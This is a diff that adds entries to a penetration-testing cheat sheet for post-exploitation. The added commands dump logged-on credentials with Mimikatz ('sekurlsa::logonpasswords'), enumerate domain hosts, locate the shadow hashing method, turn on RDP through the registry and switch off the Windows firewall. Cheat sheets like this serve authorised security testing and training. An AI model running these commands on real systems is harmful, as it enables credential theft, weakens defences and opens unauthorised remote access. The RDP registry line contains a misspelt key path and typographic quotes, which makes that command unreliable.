@@ -364,6 +364,11 @@ Prints users' shell
 which shell
 ```
 
+Find hashing algorithm used for shadow
+```console
+grep -rn ENCRYPT_METHOD /etc/login.defs
+```
+
 ### Shell
 
 Change shell for specific user
@@ -466,6 +471,11 @@ net users
 net user <USER>
 ```
 
+Show all hosts in that domain
+```console
+net view /domain
+```
+
 
 ### Weak services
 
@@ -539,10 +549,22 @@ reg query HKCU /f password /t REG_SZ /s
 ```
 
 #### Mimikatz
+
+Enable log file (mimikatz.log)
+```console
+standard::log
+```
+
 Enable debugging
 ```console
 privilege::debug
 ```
+
+List all provider credentials
+```console
+sekurlsa::logonpasswords
+```
+
 
 ### Exploits
 
@@ -554,6 +576,18 @@ python pyinstaller.py --onefile <EXPLOIT.py>
 Cross compiling
 ```console
 i686-w64-mingw32-gcc <EXPLOIT.c> -lws2_32 -o <BINARY>
+```
+
+### Misc
+
+Activate RDP
+```console
+reg add “HKLM\SYSTEM\CurentControlSet\Control\Terminal Server”  /v fDenyTSConnections /t REG_DWORD /d 0 /f
+```
+
+Deactivate Firewall
+```console
+netsh firewall set opmode disable
 ```
 
 
